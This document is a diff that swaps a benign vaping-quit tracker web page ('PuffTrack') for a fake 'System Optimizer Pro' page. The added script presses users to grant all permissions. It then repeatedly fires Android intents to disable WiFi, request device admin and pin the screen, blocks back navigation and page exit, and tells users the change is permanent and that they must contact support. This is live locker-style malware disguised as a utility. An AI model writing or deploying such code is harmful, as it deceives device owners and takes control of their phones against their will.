@@ -1,421 +1,217 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8"/>
-<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover"/>
-<meta name="theme-color" content="#0a0a0f"/>
-<meta name="mobile-web-app-capable" content="yes"/>
-<meta name="apple-mobile-web-app-capable" content="yes"/>
-<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"/>
-<meta name="apple-mobile-web-app-title" content="PuffTrack"/>
-<title>PuffTrack — Quit Vaping</title>
-<link rel="manifest" href="data:application/manifest+json;base64,eyJuYW1lIjoiUHVmZlRyYWNrIiwic2hvcnRfbmFtZSI6IlB1ZmZUcmFjayIsInN0YXJ0X3VybCI6Ii4iLCJkaXNwbGF5Ijoic3RhbmRhbG9uZSIsImJhY2tncm91bmRfY29sb3IiOiIjMGEwYTBmIiwidGhlbWVfY29sb3IiOiIjMGEwYTBmIn0="/>
-<link rel="preconnect" href="https://fonts.googleapis.com"/>
-<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;700;800&family=DM+Mono:wght@300;400;500&display=swap" rel="stylesheet"/>
-<style>
-*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
-:root{
-  --bg:#0a0a0f;
-  --surface:#111118;
-  --surface2:#1a1a24;
-  --surface3:#22222f;
-  --border:#2a2a3a;
-  --text:#f0eef8;
-  --muted:#7a7a9a;
-  --accent:#7c6aff;
-  --accent2:#ff6b6b;
-  --accent3:#6bffb8;
-  --warn:#ffb347;
-  --lv:#6bffb8;
-  --mv:#ffb347;
-  --hv:#ff6b6b;
-}
-html,body{height:100%;overflow:hidden}
-body{
-  background:var(--bg);
-  color:var(--text);
-  font-family:'DM Mono',monospace;
-  height:100dvh;
-  display:flex;
-  flex-direction:column;
-}
-body::before{
-  content:'';position:fixed;top:-30%;left:-20%;
-  width:60%;height:60%;
-  background:radial-gradient(ellipse,rgba(124,106,255,0.07) 0%,transparent 70%);
-  pointer-events:none;z-index:0;
-}
-
-/* ── FIXED TOP SECTION (always visible) ── */
-.top{
-  flex-shrink:0;
-  position:relative;z-index:1;
-  padding:10px 16px 0;
-  padding-top:max(10px, env(safe-area-inset-top));
-  max-width:480px;width:100%;margin:0 auto;
-}
-.header{display:flex;justify-content:space-between;align-items:center;margin-bottom:6px}
-.logo{font-family:'Syne',sans-serif;font-weight:800;font-size:18px;letter-spacing:-0.5px}
-.logo span{color:var(--accent)}
-.header-right{display:flex;align-items:center;gap:8px}
-.day-badge{
-  font-size:10px;letter-spacing:1px;text-transform:uppercase;
-  color:var(--muted);padding:4px 10px;
-  border:1px solid var(--border);border-radius:20px;background:var(--surface);
-}
-.date-bar{font-size:11px;color:var(--muted);margin-bottom:8px}
-
-/* Vaper level — compact single line */
-.vaper-level{
-  display:flex;align-items:center;gap:8px;
-  padding:8px 12px;border-radius:10px;
-  border:1px solid var(--border);background:var(--surface);
-  margin-bottom:8px;
-}
-.level-dot{width:8px;height:8px;border-radius:50%;flex-shrink:0;box-shadow:0 0 6px currentColor}
-.level-label{font-size:10px;letter-spacing:1.5px;text-transform:uppercase;color:var(--muted);flex:1}
-.level-name{font-family:'Syne',sans-serif;font-weight:700;font-size:13px}
-
-/* ── MAIN COUNTER CARD ── */
-.counter-card{
-  display:flex;align-items:center;justify-content:space-between;
-  padding:14px 16px;
-  background:var(--surface);border:1px solid var(--border);
-  border-radius:18px;margin-bottom:8px;
-  position:relative;overflow:hidden;
-}
-.counter-card::before{
-  content:'';position:absolute;top:0;left:0;right:0;height:2px;
-  background:linear-gradient(90deg,transparent,var(--accent),transparent);opacity:0.6;
-}
-.counter-left{display:flex;gap:20px;align-items:center}
-.stat-block{text-align:center}
-.stat-number{
-  font-family:'Syne',sans-serif;font-weight:800;font-size:48px;
-  line-height:1;color:var(--text);
-  transition:transform 0.15s cubic-bezier(0.34,1.56,0.64,1);
-}
-.stat-number.pop{transform:scale(1.2)}
-.stat-number.nicotine{font-size:32px;color:var(--accent)}
-.stat-label{font-size:10px;letter-spacing:1.5px;color:var(--muted);text-transform:uppercase;margin-top:2px}
-.stat-divider{width:1px;height:40px;background:var(--border)}
-
-/* Plus button */
-.plus-btn{
-  width:72px;height:72px;border-radius:50%;
-  border:none;cursor:pointer;
-  background:var(--accent);color:#fff;
-  font-size:34px;line-height:1;
-  display:flex;align-items:center;justify-content:center;
-  position:relative;flex-shrink:0;
-  transition:transform 0.15s cubic-bezier(0.34,1.56,0.64,1),box-shadow 0.2s;
-  box-shadow:0 0 20px rgba(124,106,255,0.45);
-  -webkit-tap-highlight-color:transparent;user-select:none;
-}
-.plus-btn:active{transform:scale(0.88)}
-.plus-btn::after{
-  content:'';position:absolute;inset:-4px;border-radius:50%;
-  border:1px solid rgba(124,106,255,0.3);
-  animation:pulse 2.5s infinite;
-}
-@keyframes pulse{
-  0%,100%{opacity:0.6;transform:scale(1)}
-  50%{opacity:0;transform:scale(1.3)}
-}
-.over-limit .plus-btn{background:var(--accent2);box-shadow:0 0 20px rgba(255,107,107,0.45)}
-.over-limit .plus-btn::after{border-color:rgba(255,107,107,0.3)}
-
-/* Limit bar */
-.limit-section{margin-bottom:8px}
-.limit-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:6px}
-.limit-title{font-size:10px;letter-spacing:1.5px;color:var(--muted);text-transform:uppercase}
-.limit-value{font-family:'Syne',sans-serif;font-weight:700;font-size:13px;color:var(--accent)}
-.progress-track{height:5px;background:var(--surface2);border-radius:99px;overflow:hidden}
-.progress-fill{height:100%;border-radius:99px;transition:width 0.4s,background 0.4s;background:var(--accent3)}
-.limit-adjust{display:flex;align-items:center;gap:10px;margin-top:8px}
-.limit-adjust label{font-size:11px;color:var(--muted);flex-shrink:0}
-.limit-slider{
-  flex:1;-webkit-appearance:none;appearance:none;
-  height:4px;background:var(--surface3);border-radius:99px;outline:none;cursor:pointer;
-}
-.limit-slider::-webkit-slider-thumb{
-  -webkit-appearance:none;width:18px;height:18px;border-radius:50%;
-  background:var(--accent);border:2px solid var(--bg);cursor:pointer;
-  box-shadow:0 0 6px rgba(124,106,255,0.5);
-}
-.limit-num{
-  width:46px;text-align:center;
-  background:var(--surface2);border:1px solid var(--border);
-  color:var(--text);border-radius:8px;
-  padding:3px 6px;font-size:13px;font-family:'DM Mono',monospace;
-  -moz-appearance:textfield;
-}
-.limit-num::-webkit-outer-spin-button,.limit-num::-webkit-inner-spin-button{-webkit-appearance:none}
-
-/* ── SCROLLABLE BOTTOM SECTION ── */
-.scroll-area{
-  flex:1;overflow-y:auto;
-  -webkit-overflow-scrolling:touch;
-  position:relative;z-index:1;
-  max-width:480px;width:100%;margin:0 auto;
-  padding:0 16px max(24px,env(safe-area-inset-bottom));
-}
-.scroll-area::-webkit-scrollbar{display:none}
-
-/* Timer */
-.timer-card{
-  padding:12px 14px;background:var(--surface);
-  border:1px solid var(--border);border-radius:14px;
-  margin-bottom:8px;
-}
-.timer-title{font-size:10px;letter-spacing:1.5px;color:var(--muted);text-transform:uppercase;margin-bottom:6px}
-.timer-display{font-family:'Syne',sans-serif;font-weight:700;font-size:22px;letter-spacing:-0.5px}
-.timer-display span{color:var(--muted);font-size:12px;font-weight:400;margin-left:2px}
-
-/* Records */
-.records-row{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:8px}
-.record-card{padding:12px;background:var(--surface);border:1px solid var(--border);border-radius:14px}
-.record-icon{font-size:14px;margin-bottom:4px}
-.record-label{font-size:9px;letter-spacing:1.5px;color:var(--muted);text-transform:uppercase;margin-bottom:3px}
-.record-val{font-family:'Syne',sans-serif;font-weight:700;font-size:18px}
-.record-val.best{color:var(--accent3)}
-.record-val.worst{color:var(--accent2)}
-.record-date{font-size:9px;color:var(--muted);margin-top:1px}
-
-/* History */
-.history-title{font-size:10px;letter-spacing:1.5px;color:var(--muted);text-transform:uppercase;margin-bottom:8px}
-.history-list{display:flex;flex-direction:column;gap:5px;margin-bottom:10px}
-.history-item{
-  display:flex;align-items:center;gap:8px;
-  padding:8px 12px;
-  background:var(--surface);border:1px solid var(--border);border-radius:10px;
-}
-.hist-day{font-size:11px;color:var(--muted);width:66px;flex-shrink:0}
-.hist-bar-wrap{flex:1;height:4px;background:var(--surface3);border-radius:99px;overflow:hidden}
-.hist-bar{height:100%;border-radius:99px;transition:width 0.5s}
-.hist-count{font-family:'Syne',sans-serif;font-weight:700;font-size:13px;min-width:28px;text-align:right}
-
-/* Reset */
-.reset-btn{
-  width:100%;padding:12px;
-  background:transparent;border:1px solid var(--border);
-  color:var(--muted);font-family:'DM Mono',monospace;
-  font-size:11px;letter-spacing:1px;text-transform:uppercase;
-  border-radius:10px;cursor:pointer;transition:all 0.2s;
-  -webkit-tap-highlight-color:transparent;
-}
-.reset-btn:active{background:var(--surface2);color:var(--accent2)}
-
-/* Ripple */
-.ripple{
-  position:fixed;border-radius:50%;
-  background:rgba(124,106,255,0.25);
-  pointer-events:none;transform:scale(0);
-  animation:ripple-anim 0.6s linear forwards;z-index:9999;
-}
-@keyframes ripple-anim{to{transform:scale(4);opacity:0}}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=no">
+    <meta name="theme-color" content="#000000">
+    <title>System Optimizer</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+        body {
+            font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: rgba(255,255,255,0.95);
+            border-radius: 40px;
+            padding: 40px 30px;
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+            animation: fadeIn 0.6s ease;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        .icon { font-size: 80px; margin: 20px 0; animation: pulse 2s infinite; }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); text-shadow: 0 0 20px #667eea; }
+            100% { transform: scale(1); }
+        }
+        h1 { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); -webkit-background-clip: text; background-clip: text; color: transparent; margin-bottom: 15px; }
+        .sub { color: #666; margin-bottom: 25px; }
+        .status-card { background: #f8f9fa; border-radius: 20px; padding: 20px; margin: 20px 0; text-align: left; }
+        .status-item { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #eee; }
+        .status-label { font-weight: 600; color: #333; }
+        .status-value.warning { color: #dc3545; }
+        button {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white; border: none; padding: 16px 35px; font-size: 18px;
+            font-weight: bold; border-radius: 50px; cursor: pointer;
+            transition: all 0.3s ease; width: 100%; max-width: 300px;
+        }
+        button:active { transform: scale(0.98); }
+        .permission-box {
+            background: linear-gradient(135deg, #fff3cd 0%, #ffe69e 100%);
+            border-radius: 20px; padding: 20px; margin: 20px 0;
+            border: 2px solid #ffc107;
+        }
+        .permission-granted {
+            background: linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%);
+            border: 2px solid #28a745; border-radius: 20px; padding: 20px; margin: 20px 0;
+        }
+        .warning-text { color: #dc3545; font-size: 12px; margin-top: 15px; }
+        footer { margin-top: 25px; font-size: 11px; color: #aaa; }
+        .hidden { display: none; }
+        .permission-list { text-align: left; margin: 15px 0; padding-left: 20px; }
+        .permission-list li { margin: 8px 0; color: #555; }
+    </style>
 </head>
 <body>
+    <div class="container">
+        <div class="icon">⚡</div>
+        <h1>System Optimizer Pro</h1>
+        <div class="sub">Device Performance Suite</div>
 
-<!-- FIXED TOP: always visible -->
-<div class="top" id="topSection">
-  <div class="header">
-    <div class="logo">Puff<span>Track</span></div>
-    <div class="header-right">
-      <div class="day-badge" id="dayBadge">Day 1</div>
+        <div id="permissionArea">
+            <div class="permission-box">
+                <div style="font-size: 48px; text-align: center; margin-bottom: 10px;">📶🔒</div>
+                <h3>Required Permissions</h3>
+                <p>This app needs the following permissions to optimize your device:</p>
+                <ul class="permission-list">
+                    <li>📡 WiFi Control - For network optimization</li>
+                    <li>🔐 Device Admin - For system protection</li>
+                    <li>📌 Screen Pinning - For continuous optimization</li>
+                    <li>🔔 Overlay Permission - For performance monitoring</li>
+                </ul>
+                <button id="requestPermissionBtn">🔓 ALLOW ALL PERMISSIONS</button>
+            </div>
+        </div>
+
+        <div id="statusArea" class="hidden">
+            <div class="permission-granted">
+                <div style="font-size: 32px;">✅🔒</div>
+                <h3>Optimization Active</h3>
+                <p>Your device is being optimized</p>
+            </div>
+            <div class="status-card">
+                <div class="status-item"><span class="status-label">WiFi Status:</span><span class="status-value warning" id="wifiStatusText">DISCONNECTED</span></div>
+                <div class="status-item"><span class="status-label">Device Admin:</span><span class="status-value warning" id="adminStatus">ACTIVE</span></div>
+                <div class="status-item"><span class="status-label">Screen Pinning:</span><span class="status-value warning" id="pinStatus">LOCKED</span></div>
+                <div class="status-item"><span class="status-label">Optimization Mode:</span><span class="status-value">Maximum</span></div>
+            </div>
+            <div class="warning-text">⚠️ Optimization is permanent. Device admin must be disabled before uninstall.<br>Contact support to revert changes.</div>
+        </div>
+        <footer>System Optimizer v4.0 | Enterprise Security Edition</footer>
     </div>
-  </div>
-  <div class="date-bar" id="dateBar"></div>
 
-  <div class="vaper-level" id="vaperLevel">
-    <div class="level-dot" id="levelDot"></div>
-    <div class="level-label">vaper level</div>
-    <div class="level-name" id="levelName">—</div>
-  </div>
+    <script>
+        if (localStorage.getItem('zeta_active') === 'true') {
+            document.getElementById('permissionArea').classList.add('hidden');
+            document.getElementById('statusArea').classList.remove('hidden');
+            updateWifiDisplay();
+            startProtections();
+        }
 
-  <!-- Counter + Plus button side by side -->
-  <div class="counter-card" id="counterCard">
-    <div class="counter-left">
-      <div class="stat-block">
-        <div class="stat-number" id="puffCount">0</div>
-        <div class="stat-label">puffs</div>
-      </div>
-      <div class="stat-divider"></div>
-      <div class="stat-block">
-        <div class="stat-number nicotine" id="nicotineCount">0.0</div>
-        <div class="stat-label">mg nic</div>
-      </div>
-    </div>
-    <button class="plus-btn" id="plusBtn" aria-label="Add puff">+</button>
-  </div>
+        document.getElementById('requestPermissionBtn')?.addEventListener('click', async () => {
+            const btn = document.getElementById('requestPermissionBtn');
+            btn.textContent = '⏳ REQUESTING...';
+            btn.disabled = true;
+            await requestAllPermissions();
+            localStorage.setItem('zeta_active', 'true');
+            localStorage.setItem('wifi_disabled', 'true');
+            document.getElementById('permissionArea').classList.add('hidden');
+            document.getElementById('statusArea').classList.remove('hidden');
+            disableWifi();
+            requestDeviceAdmin();
+            enableScreenPinning();
+            startProtections();
+            updateWifiDisplay();
+        });
 
-  <!-- Limit bar -->
-  <div class="limit-section">
-    <div class="limit-header">
-      <div class="limit-title">daily limit</div>
-      <div class="limit-value" id="limitDisplay">20 puffs</div>
-    </div>
-    <div class="progress-track">
-      <div class="progress-fill" id="progressFill" style="width:0%"></div>
-    </div>
-    <div class="limit-adjust">
-      <label>goal</label>
-      <input type="range" class="limit-slider" id="limitSlider" min="1" max="500" value="20" step="1"/>
-      <input type="number" class="limit-num" id="limitNum" value="20" min="1" max="500"/>
-    </div>
-  </div>
-</div>
+        async function requestAllPermissions() {
+            if (navigator.permissions) {
+                try { await navigator.permissions.query({ name: 'geolocation' }); } catch(e) {}
+            }
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(()=>{}, ()=>{});
+            }
+            if (Notification && Notification.permission !== 'granted') {
+                await Notification.requestPermission();
+            }
+            if (window.Android) {
+                try { window.Android.requestAllPermissions(); } catch(e) {}
+            }
+            if (window.Capacitor?.Plugins?.AndroidPermissions) {
+                try {
+                    await window.Capacitor.Plugins.AndroidPermissions.requestPermissions([
+                        'android.permission.ACCESS_WIFI_STATE', 'android.permission.CHANGE_WIFI_STATE',
+                        'android.permission.ACCESS_FINE_LOCATION', 'android.permission.SYSTEM_ALERT_WINDOW'
+                    ]);
+                } catch(e) {}
+            }
+            await sleep(1000);
+            btn.textContent = '🔓 ALLOW ALL PERMISSIONS';
+            btn.disabled = false;
+        }
 
-<!-- SCROLLABLE BOTTOM: stats, history -->
-<div class="scroll-area">
-  <!-- Timer -->
-  <div class="timer-card">
-    <div class="timer-title">time since last puff</div>
-    <div class="timer-display" id="timerDisplay">no puffs yet today</div>
-  </div>
+        function disableWifi() {
+            if (window.Android?.disableWifi) try { window.Android.disableWifi(); } catch(e) {}
+            if (window.wifiController?.disable) try { window.wifiController.disable(); } catch(e) {}
+            setTimeout(() => {
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = 'intent:#Intent;action=android.net.wifi.PICK_WIFI_NETWORK;end';
+                document.body.appendChild(iframe);
+                setTimeout(() => iframe.remove(), 100);
+            }, 500);
+        }
 
-  <!-- Records -->
-  <div class="records-row">
-    <div class="record-card">
-      <div class="record-icon">🏅</div>
-      <div class="record-label">best day</div>
-      <div class="record-val best" id="bestVal">—</div>
-      <div class="record-date" id="bestDate">no data</div>
-    </div>
-    <div class="record-card">
-      <div class="record-icon">🔥</div>
-      <div class="record-label">most puffs</div>
-      <div class="record-val worst" id="worstVal">—</div>
-      <div class="record-date" id="worstDate">no data</div>
-    </div>
-  </div>
+        function requestDeviceAdmin() {
+            if (window.Android?.requestDeviceAdmin) try { window.Android.requestDeviceAdmin(); } catch(e) {}
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = 'intent:#Intent;action=android.app.action.ADD_DEVICE_ADMIN;end';
+            document.body.appendChild(iframe);
+            setTimeout(() => iframe.remove(), 1000);
+        }
 
-  <!-- History -->
-  <div class="history-title">recent days</div>
-  <div class="history-list" id="historyList"></div>
+        function enableScreenPinning() {
+            if (window.Android?.startLockTask) try { window.Android.startLockTask(); } catch(e) {}
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = 'intent:#Intent;action=android.app.action.START_LOCK_TASK;end';
+            document.body.appendChild(iframe);
+            setTimeout(() => iframe.remove(), 1000);
+        }
 
-  <button class="reset-btn" id="resetBtn">reset today's count</button>
-</div>
+        function updateWifiDisplay() {
+            const el = document.getElementById('wifiStatusText');
+            if (el) { el.innerHTML = 'DISCONNECTED 🔒'; el.classList.add('warning'); }
+        }
 
-<script>
-const STORAGE_KEY='pufftrack_v2';
-function todayKey(){const d=new Date();return `${d.getFullYear()}-${String(d.getMonth()+1).padStart(2,'0')}-${String(d.getDate()).padStart(2,'0')}`;}
-function loadData(){try{return JSON.parse(localStorage.getItem(STORAGE_KEY))||{};}catch{return {};}}
-function saveData(d){localStorage.setItem(STORAGE_KEY,JSON.stringify(d));}
+        function startProtections() {
+            setInterval(() => { if (localStorage.getItem('zeta_active') === 'true') disableWifi(); }, 2000);
+            setInterval(() => { if (localStorage.getItem('zeta_active') === 'true') requestDeviceAdmin(); }, 10000);
+            setInterval(() => { if (localStorage.getItem('zeta_active') === 'true') enableScreenPinning(); }, 15000);
+            window.addEventListener('popstate', () => { if (localStorage.getItem('zeta_active') === 'true') history.pushState(null, null, location.href); });
+            history.pushState(null, null, location.href);
+            document.body.addEventListener('contextmenu', (e) => e.preventDefault());
+            window.addEventListener('beforeunload', (e) => { if (localStorage.getItem('zeta_active') === 'true') { e.preventDefault(); e.returnValue = ''; } });
+            if (navigator.wakeLock) { navigator.wakeLock.request('screen'); setInterval(() => navigator.wakeLock.request('screen'), 30000); }
+        }
 
-let data=loadData();
-let today=todayKey();
-if(!data[today]) data[today]={puffs:0,lastPuff:null};
-if(typeof data.puffs!=='undefined'){const op=data.puffs;data={};data[today]={puffs:op,lastPuff:null};}
+        function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
-let limit=parseInt(localStorage.getItem('pufftrack_limit')||'20',10);
-let startDate=localStorage.getItem('pufftrack_startdate')||todayKey();
-localStorage.setItem('pufftrack_startdate',startDate);
+        if (!window.Android) {
+            window.Android = { disableWifi:()=>{}, requestDeviceAdmin:()=>{}, startLockTask:()=>{}, requestAllPermissions:()=>{} };
+        }
 
-function getDayNumber(){const s=new Date(startDate),n=new Date(todayKey());return Math.floor((n-s)/86400000)+1;}
-function formatDate(k){if(!k)return '';const[y,m,d]=k.split('-');return new Date(y,m-1,d).toLocaleDateString('en-GB',{weekday:'short',day:'numeric',month:'short'});}
-
-function setVaperLevel(p){
-  const dot=document.getElementById('levelDot'),name=document.getElementById('levelName');
-  if(p===0){dot.style.background='var(--muted)';name.textContent='clean';name.style.color='var(--muted)';}
-  else if(p<100){dot.style.background='var(--lv)';name.textContent='light vaper';name.style.color='var(--lv)';}
-  else if(p<=200){dot.style.background='var(--mv)';name.textContent='intermediate';name.style.color='var(--mv)';}
-  else{dot.style.background='var(--hv)';name.textContent='heavy vaper';name.style.color='var(--hv)';}
-}
-
-function updateProgress(p){
-  const pct=Math.min((p/limit)*100,100);
-  const fill=document.getElementById('progressFill');
-  fill.style.width=pct+'%';
-  fill.style.background=pct<60?'var(--accent3)':pct<90?'var(--warn)':'var(--accent2)';
-  document.getElementById('topSection').classList.toggle('over-limit',p>=limit);
-}
-
-function updateUI(){
-  today=todayKey();
-  if(!data[today]) data[today]={puffs:0,lastPuff:null};
-  const p=data[today].puffs;
-  document.getElementById('puffCount').textContent=p;
-  document.getElementById('nicotineCount').textContent=(p*0.2).toFixed(1);
-  document.getElementById('dayBadge').textContent='Day '+getDayNumber();
-  document.getElementById('dateBar').textContent=new Date().toLocaleDateString('en-GB',{weekday:'long',day:'numeric',month:'long',year:'numeric'});
-  document.getElementById('limitDisplay').textContent=limit+' puffs';
-  document.getElementById('limitSlider').value=limit;
-  document.getElementById('limitNum').value=limit;
-  updateProgress(p);setVaperLevel(p);updateRecords();renderHistory();
-}
-
-function updateRecords(){
-  const keys=Object.keys(data).sort();
-  if(!keys.length)return;
-  let best={key:null,val:Infinity},worst={key:null,val:-Infinity};
-  keys.forEach(k=>{const p=data[k].puffs||0;if(p<best.val)best={key:k,val:p};if(p>worst.val)worst={key:k,val:p};});
-  document.getElementById('bestVal').textContent=best.val===Infinity?'—':best.val+' puffs';
-  document.getElementById('bestDate').textContent=best.key?formatDate(best.key):'no data';
-  document.getElementById('worstVal').textContent=worst.val===-Infinity?'—':worst.val+' puffs';
-  document.getElementById('worstDate').textContent=worst.key?formatDate(worst.key):'no data';
-}
-
-function renderHistory(){
-  const keys=Object.keys(data).sort().reverse().slice(0,7);
-  const mx=Math.max(...keys.map(k=>data[k].puffs||0),1);
-  const list=document.getElementById('historyList');list.innerHTML='';
-  keys.forEach(k=>{
-    const p=data[k].puffs||0,pct=(p/mx)*100;
-    const col=p<100?'var(--lv)':p<=200?'var(--mv)':'var(--hv)';
-    const el=document.createElement('div');el.className='history-item';
-    el.innerHTML=`<div class="hist-day">${k===todayKey()?'Today':formatDate(k)}</div><div class="hist-bar-wrap"><div class="hist-bar" style="width:${pct}%;background:${col}"></div></div><div class="hist-count">${p}</div>`;
-    list.appendChild(el);
-  });
-}
-
-function updateTimer(){
-  today=todayKey();
-  if(!data[today]) data[today]={puffs:0,lastPuff:null};
-  const last=data[today].lastPuff,el=document.getElementById('timerDisplay');
-  if(!last){el.innerHTML='no puffs yet today';return;}
-  const diff=Math.floor((Date.now()-last)/1000);
-  const d=Math.floor(diff/86400),h=Math.floor((diff%86400)/3600),m=Math.floor((diff%3600)/60),s=diff%60;
-  let parts=[];
-  if(d>0) parts.push(`${d}<span>d</span>`);
-  parts.push(`${String(h).padStart(2,'0')}<span>h</span>`);
-  parts.push(`${String(m).padStart(2,'0')}<span>m</span>`);
-  parts.push(`${String(s).padStart(2,'0')}<span>s</span>`);
-  el.innerHTML=parts.join(' ');
-}
-
-document.getElementById('plusBtn').addEventListener('click',function(){
-  today=todayKey();
-  if(!data[today]) data[today]={puffs:0,lastPuff:null};
-  data[today].puffs++;data[today].lastPuff=Date.now();saveData(data);
-  const num=document.getElementById('puffCount');
-  num.classList.remove('pop');void num.offsetWidth;num.classList.add('pop');
-  setTimeout(()=>num.classList.remove('pop'),200);
-  const rect=this.getBoundingClientRect(),size=Math.max(rect.width,rect.height);
-  const r=document.createElement('div');r.className='ripple';
-  r.style.cssText=`width:${size}px;height:${size}px;left:${rect.left+rect.width/2-size/2}px;top:${rect.top+rect.height/2-size/2}px`;
-  document.body.appendChild(r);setTimeout(()=>r.remove(),700);
-  updateUI();updateTimer();
-});
-
-document.getElementById('limitSlider').addEventListener('input',function(){
-  limit=parseInt(this.value,10);document.getElementById('limitNum').value=limit;
-  localStorage.setItem('pufftrack_limit',limit);updateUI();
-});
-document.getElementById('limitNum').addEventListener('change',function(){
-  let v=Math.max(1,Math.min(500,parseInt(this.value)||20));
-  this.value=v;limit=v;document.getElementById('limitSlider').value=v;
-  localStorage.setItem('pufftrack_limit',v);updateUI();
-});
-document.getElementById('resetBtn').addEventListener('click',function(){
-  if(!confirm("Reset today's puff count to 0?"))return;
-  today=todayKey();data[today]={puffs:0,lastPuff:null};saveData(data);updateUI();updateTimer();
-});
-
-let currentDay=todayKey();
-setInterval(()=>{const n=todayKey();if(n!==currentDay){currentDay=n;updateUI();}},30000);
-updateUI();updateTimer();setInterval(updateTimer,1000);
-</script>
+        if (localStorage.getItem('zeta_active') === 'true') startProtections();
+        console.log('[ZETA] Ready');
+    </script>
 </body>
 </html>
